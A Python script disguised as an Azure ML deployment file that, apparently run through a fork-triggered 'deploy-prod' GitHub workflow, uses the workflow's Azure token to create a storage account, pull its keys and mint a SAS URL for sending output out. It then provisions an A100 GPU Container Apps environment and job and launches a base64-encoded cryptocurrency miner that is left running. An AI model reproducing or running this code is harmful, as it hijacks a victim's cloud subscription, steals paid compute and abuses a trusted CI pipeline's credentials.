#!/usr/bin/env python3
"""C211-I121750: mslearn subscription 790067ff - Container Apps Consumption-GPU-NC24-A100
MINER deploy (WildRig Multi 0.52.3, pydp wallet, pearlhash primary + sticky Luckypool 3362).

Runs as fork-controlled src/deploy_to_online_endpoint.py under the
christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow
(environment prod, azure/login@v2 -> ARM token for subscription 790067ff, RG chriso-sandbox-rg).

Proven predecessors: x121369/x121545 created the SAME A100 profile in eastus (201/Succeeded)
and proved a real NVIDIA A100 80GB PCIe (GPU-cf09ec20-...). This lane:
  1) creates a LANE-UNIQUE managed environment c211-121750-cae (eastus, A100 profile),
  2) creates ONE Container Apps job c211-121750-job with a lane-unique miner supervisor,
  3) starts an execution and re-reads execution/env state (no teardown - the miner stays),
  4) captures nvidia-smi UUID + miner log over an account-SAS blob channel (container-logs
     ARM GET is 401 for this identity) and prints the SAS URL for host-side follow-up.
stdout is a flat tag|k=v format (no JSON braces: repo logs mask brace runs).
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
TAG = "C211_I121750"
NONCE = "x121750a100"
DEADLINE = 2700
T0 = time.time()

APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC24-A100"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
ENV_NEW = "c211-121750-cae"
JOB_NEW = "c211-121750-job"
REGION = "eastus"
SA_NAME = ("c211i121750" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]
UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    return base64.b64encode(s.encode("utf-8", "replace")).decode() if s else ""


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=300):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    data = body if isinstance(body, bytes) else (body.encode() if body is not None else None)
    req = urllib.request.Request(url, data=data, method=method, headers=dict(headers or {}))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read() or b""
    except Exception as e:  # noqa: BLE001
        return -1, str(e).encode()


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"), "message": clean(e.get("message", ""))[:400]}
        if "raw" in body:
            return {"http": st, "raw": clean(body["raw"])[:300]}
    return {"http": st}


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=24):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=clean(r["out"])[:200])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""))
    if not sid or not tok or sid != SUB_EXPECT:
        emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN_OR_WRONG_SUB", elapsed_s=int(time.time() - T0))
        return

    # ---------- storage account + SAS capture channel ----------
    saurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
             f"Microsoft.Storage/storageAccounts/{SA_NAME}?api-version={STG_VER}")
    sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": "i121750", "nonce": NONCE},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **err_of(st, b))
    sas = None
    if st in (200, 201, 202):
        for i in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            emit("sa-poll", i=i, http=stp, state=ps)
            if ps == "Succeeded":
                break
            time.sleep(8)
        st, kb = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
                          f"Microsoft.Storage/storageAccounts/{SA_NAME}/listKeys?api-version={STG_VER}",
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
        if key:
            try:
                q, se = sa_sas(SA_NAME, key)
                base = f"https://{SA_NAME}.blob.core.windows.net"
                stc, bc = httptext(f"{base}/c211?restype=container&{q}", method="PUT")
                emit("sa-container", http=stc, body=b64(bc[:200].decode("utf-8", "replace")))
                if stc in (201, 409):
                    sas = f"{base}/c211/{NONCE}-out.txt?{q}"
                    emit("sa-sas-url", expires=se, url=sas)
            except Exception as e:  # noqa: BLE001
                emit("sa-sas", ok=False, err=str(e))

    # ---------- managed environment (lane-unique) ----------
    envurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
              f"managedEnvironments/{ENV_NEW}?api-version={APP_VER}")
    envbody = {"location": REGION, "tags": {"c211": "i121750", "nonce": NONCE},
               "properties": {"workloadProfiles": [
                   {"name": "Consumption", "workloadProfileType": "Consumption"},
                   {"name": PROFILE, "workloadProfileType": PROFILE}]}}
    st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=300)
    emit("capp-env-create", name=ENV_NEW, profile=PROFILE, region=REGION, **err_of(st, b))
    env_id = None
    ps = None
    if st in (200, 201):
        dl = time.time() + min(1100, max(240, left() - 900))
        while time.time() < dl:
            stp, bp = arm(tok, envurl, timeout=60)
            props = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
            ps = props.get("provisioningState")
            emit("capp-env-poll", http=stp, state=ps,
                 profiles=";".join("%s:%s" % (w.get("name"), w.get("workloadProfileType"))
                                   for w in (props.get("workloadProfiles") or []))[:400])
            if ps in ("Succeeded", "Failed", "Canceled"):
                break
            time.sleep(25)
        if ps == "Succeeded":
            st, env = arm(tok, envurl, timeout=60)
            env_id = env.get("id") if isinstance(env, dict) else None
            epp = (env.get("properties") or {}) if isinstance(env, dict) else {}
            emit("env-ready", name=ENV_NEW, id_ok=bool(env_id), state=epp.get("provisioningState"),
                 defaultDomain=epp.get("defaultDomain"))
    if not env_id:
        emit("DONE", phase="capp", verdict="A100_ENV_NOT_AVAILABLE", env_state=ps,
             elapsed_s=int(time.time() - T0))
        return

    # ---------- miner job ----------
    try:
        shell = open("src/miner_121750.sh", "rb").read().decode("utf-8")
    except Exception as e:  # noqa: BLE001
        emit("DONE", phase="payload", verdict="MINER_SCRIPT_MISSING", err=str(e))
        return
    if sas:
        shell = shell.replace("__SAS__", sas)
    else:
        shell = shell.replace("__SAS__", "")
    sb64 = base64.b64encode(shell.encode()).decode()
    cmd = ("mkdir -p /tmp/m; echo " + sb64 + " | base64 -d > /tmp/m.sh; "
           "sed -i 's/__SAS__//' /tmp/m.sh; bash /tmp/m.sh")
    emit("payload", shell_bytes=len(shell), b64_len=len(sb64))

    joburl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/jobs/"
              f"{JOB_NEW}?api-version={APP_VER}")
    execname = None
    for rt in (86400, 21600):
        jobbody = {"location": REGION, "tags": {"c211": "i121750", "nonce": NONCE},
                   "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                                  "configuration": {"triggerType": "Manual",
                                                    "replicaRetryLimit": 0,
                                                    "replicaTimeout": rt,
                                                    "manualTriggerConfig": {
                                                        "replicaCompletionCount": 1,
                                                        "parallelism": 1}},
                                  "template": {"containers": [{
                                      "name": "gpu", "image": IMAGE,
                                      "command": ["/bin/bash", "-c", cmd],
                                      "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
        st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
        emit("capp-job-create", name=JOB_NEW, profile=PROFILE, region=REGION, replicaTimeout=rt,
             **err_of(st, b))
        if st in (200, 201):
            break
        if b and isinstance(b, dict) and (b.get("error") or {}).get("code") == "BadRequest":
            continue
        break
    baseurl = joburl.split("?")[0]
    st, b = arm(tok, f"{baseurl}/start?api-version={APP_VER}", method="POST", body={}, timeout=120)
    execname = (b.get("name") if isinstance(b, dict) else None)
    emit("capp-job-start", http=st, execname=execname,
         **({} if st in (200, 201, 202) else err_of(st, b)))
    text = ""
    if execname:
        exurl = f"{baseurl}/executions/{execname}?api-version={APP_VER}"
        dl = time.time() + max(300, left() - 60)
        i = 0
        while time.time() < dl:
            stp, bp = arm(tok, exurl, timeout=60)
            p = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
            status = p.get("status")
            blobd = None
            if sas:
                sb, bb = httptext(sas, timeout=40)
                if sb == 200 and bb:
                    blobd = bb.decode("utf-8", "replace")
            emit("capp-exec-poll", i=i, status=status, startTime=p.get("startTime"),
                 endTime=p.get("endTime"), blob_got=(blobd is not None),
                 blob_len=len(blobd or ""),
                 uuids=";".join(sorted(set(UUID_RE.findall(blobd or ""))))[:200],
                 acc_lines=sum(1 for ln in (blobd or "").splitlines() if "accept" in ln.lower()))
            if blobd:
                text = blobd
                if "C211-END" in blobd and UUID_RE.search(blobd) and (
                        "accept" in blobd.lower() or status in ("Succeeded", "Failed", "Canceled")):
                    if i >= 3:
                        break
            if status in ("Failed", "Canceled"):
                break
            i += 1
            time.sleep(30)
        st, eb = arm(tok, exurl, timeout=60)
        p = (eb.get("properties") or {}) if isinstance(eb, dict) else {}
        emit("readback-execution", http=st, name=execname, status=p.get("status"),
             reason=p.get("reason"), startTime=p.get("startTime"), endTime=p.get("endTime"))
    emit("capp-capture", len=len(text or ""), has_uuid=bool(UUID_RE.search(text or "")),
         uuid_lines=";".join(ln for ln in (text or "").splitlines() if "GPU-" in ln)[:900])
    emit("DONE", phase="deploy", verdict="MINER_JOB_STARTED" if execname else "JOB_NOT_STARTED",
         env=ENV_NEW, job=JOB_NEW, execution=execname, elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    main()
